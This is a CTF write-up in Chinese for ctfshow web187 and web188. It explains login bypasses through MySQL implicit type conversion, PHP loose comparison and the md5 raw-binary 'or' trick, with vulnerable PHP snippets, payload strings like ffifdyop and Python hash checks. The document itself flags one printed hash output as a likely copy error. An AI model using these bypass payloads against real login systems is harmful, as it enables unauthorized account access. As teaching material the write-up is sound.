---
title: md5与弱比较绕过
category: SQL注入/过滤绕过
tags: [ctfshow, web187, web188, md5, 二进制, 弱比较, 隐式类型转换, ffifdyop]
order: 17
---

## 一句话概括

两条容易混淆的"0 规则"：

- MySQL 侧：列和数字比较时会把列值转成数字，`'admin' = 0` 成立，所以无引号拼接时 `username=0` 能命中所有不以数字开头的用户名；
- PHP 侧：`==` 弱比较时，`0 == "abc"` 也成立，字符串转数字失败得 0，恰好和 0 相等。

另外，当密码用 `md5($pwd, true)`（原始二进制形式）参与拼接时，某些字符串的哈希字节里会天然含有 `'or'`，直接就把 SQL 注出去了。

## 被过滤/限制的东西 → 绕过手法对照表

| 场景 | 关键点 | 绕过 / 命中手法 |
|---|---|---|
| `username = {$username}`（无引号） | 数字上下文，MySQL 隐式转换 | 传 `0` 命中所有非数字开头用户名 |
| `username = '{$username}'`（有引号） | 字符串上下文 | 传 `0` 只能匹配字面量 `'0'`，行不通 |
| PHP `$row['pass'] == $password` | 弱比较，字符串转数字 | 传 `0` 与任意非数字开头的密码相等 |
| `md5($pwd, true)` 拼进 SQL | 原始二进制含 `'or'` | 用 `ffifdyop` 等字符串让哈希"吐出"引号 |

## 本题情景与解题手法：web188（无引号拼接 + 0 规则）

### 题目形态

登录逻辑如下，注意 `username` 外面没有引号：

```php
$sql = "select pass from ctfshow_user where username = {$username}";
```

### 第一步：正常的 SQL 长什么样

```sql
-- 当用户名为 admin 时
select pass from ctfshow_user where username = 'admin'

-- 当用户名为 0 时（无引号写法，0 直接进了 SQL）
select pass from ctfshow_user where username = 0
```

### 第二步：MySQL 的隐式类型转换

当字符串和数字比较时，MySQL 会把字符串转成数字再比。转换规则是"从开头取数字，取不到就是 0"：

```sql
-- 这些都返回 true
'admin' = 0     -- true，字符串不以数字开头 → 转成 0
'test'  = 0     -- true
'abc'   = 0     -- true
''      = 0     -- true

-- 以数字开头的就不成立了
'1admin' = 0    -- false，转成 1
'123'    = 0    -- false
```

假设表里有这些数据：

| id | username | pass |
|---|---|---|
| 1 | admin | 123 |
| 2 | test | 456 |
| 3 | user1 | 789 |
| 4 | 1admin | 999 |

执行 `select pass from ctfshow_user where username = 0;` 时，MySQL 逐行转换比较：

```sql
'admin' = 0   → 0 = 0 → true   ✓ 匹配
'test'  = 0   → 0 = 0 → true   ✓ 匹配
'user1' = 0   → 0 = 0 → true   ✓ 匹配
'1admin' = 0  → 1 = 0 → false  ✗ 不匹配
```

于是用户名传 0，就能一次命中所有不以数字开头的用户（包括 admin），查询一定会返回记录。

### 第三步：PHP 侧的弱比较（另一条 0 规则）

应用层拿到记录后，通常这样比较密码：

```php
if ($row['pass'] == $password) { ... }
```

PHP 的 `==` 同样是弱类型比较，规则和 MySQL 类似，字符串转数字失败得 0：

```php
0 == "0"        // true
0 == "abc"      // true   ← 关键
0 == "admin"    // true   ← 关键
0 == "anything" // true   ← 关键
0 == ""         // true

intval("abc")     // 0
intval("admin")   // 0
intval("test123") // 0
intval("")        // 0
```

所以密码位置也传 `0`，就能和任何"不以数字开头"的密码相等，直接登录成功。

### 第四步：回答"有引号不也能实现吗"

不行，两者完全不同：

| 拼接方式 | 实际 SQL | 效果 |
|---|---|---|
| 有引号 `username = '{$username}'` | `username = '0'` | 字符串比较，只匹配用户名恰好是 `'0'` 的记录；表里没有就返回空 |
| 无引号 `username = {$username}` | `username = 0` | 数字比较，触发隐式转换，匹配所有"转数字后等于 0"的用户名 |

结论：0 规则成立的前提是参数的拼接处处在数字上下文，也就是原 SQL 里参数外面没有引号。有引号时它只是普通字符串 `'0'`。

### 注入手法一句话总结

无引号拼接让参数进入数字上下文，传 `0` 利用 MySQL 隐式转换命中全表；随后 PHP 的 `==` 弱比较再用 `0` 匹配任意非数字开头的密码，两步一起构成登录绕过。

## 本题情景与解题手法：web187（md5 原始二进制注入）

### 题目形态

有些题目把密码做 `md5` 后拼进 SQL，形如：

```php
$sql = "select * from users where username='admin' and password='".md5($password, true)."'";
```

注意 `md5($password, true)` 的第二个参数 `true` 表示返回 16 字节的原始二进制，而不是常见的 32 位十六进制字符串。

### 第一步：为什么原始二进制会出问题

十六进制形式的 md5 只包含 `0-9a-f`，绝对安全。但原始二进制是任意字节，其中完全可能同时出现单引号 `'`、字母 `o`、字母 `r`：

```text
md5('ffifdyop', true) 的原始字节里含有  'or'
```

一旦这个字节流被拼进 `password='...'` 中间，`'` 就会提前闭合字符串，后面的 `or` 变成 SQL 逻辑运算符：

```sql
select * from users where username='admin' and password=''or'...'
--                                                      ↑ ' 闭合，or 生效
```

`''or'...'` 在布尔上恒真（`''` 为假，`or` 后面只要有非空值就为真），于是登录条件被绕过。

### 第二步：已知可用的"魔法字符串"

普通字符串经过 MD5 哈希后的二进制结果中包含了 SQL 关键字：

```text
"ffifdyop"                    # 最经典的
"129581926211651571912466741651878684928"
"78628391"
```

### 第三步：用 Python 验证哈希里确实有引号

```python
import hashlib

# 对普通字符串做 MD5，拿到二进制结果
input_string = "ffifdyop"
md5_hash = hashlib.md5(input_string.encode()).digest()   # digest() = 原始二进制
print(repr(md5_hash))
```

换个例子看细节：

```python
import hashlib

s1 = "129581926211651571912466741651878684928"
raw1 = hashlib.md5(s1.encode()).digest()
print("字符串1:", s1)
print("MD5原始:", repr(raw1))
print("十六进制:", raw1.hex())
```

输出：

```text
MD5原始: b"\x06'\xd2\xf2\xaf\x06'or'8\x9b\x8c\x8b"
```

可以看到字节流里直接出现了 `'or'8`，被拼进 SQL 后形成 `' or '8'='8'` 这样的恒真条件。

### 第四步：其他候选串

```python
s2 = "78628391"
raw2 = hashlib.md5(s2.encode()).digest()
print("字符串2:", s2)
print("MD5原始:", repr(raw2))
```

这里记录的输出与上一例完全相同（`b"\x06'\xd2...'or'8..."`），很可能是复制时漏改，实际 `78628391` 的哈希字节应与上面不同。但结论成立：只要哈希的原始字节里凑出 `'or'`，这个字符串就能当万能密码。

### 第五步：使用

把候选串填进密码框，抓包重放即可。

### 注入手法一句话总结

`md5($str, true)` 返回原始二进制，字节里的 `'` 会提前闭合字符串、`or` 变成逻辑运算符。挑一个哈希中含 `'or'` 的字符串（如 `ffifdyop`）当密码，即可绕过登录校验。

## 注意事项

- `md5($x)` 和 `md5($x, true)` 完全不同：前者是 32 位十六进制（安全），后者是 16 字节原始二进制（危险）。只有 `true` 才可能拼出引号。
- "0 规则"要分清是 MySQL 还是 PHP：`username = 0` 让 MySQL 命中全表，`0 == "abc"` 让 PHP 判定密码相等，两道转换是先后发生的两件事，缺一不可。
- 有引号时 0 规则不成立：`username = '0'` 是字符串比较，只会去匹配字面量为 `0` 的用户名。
- `78628391` 的输出与前一个例子完全相同，疑似复制错误，已在正文标注；如果需要精确字节，请自行跑一遍 `hashlib.md5(...).digest()` 验证。
- 判断一个字符串能不能用，最直接的办法就是 `repr(hashlib.md5(s.encode()).digest())`，看有没有 `'or'`。
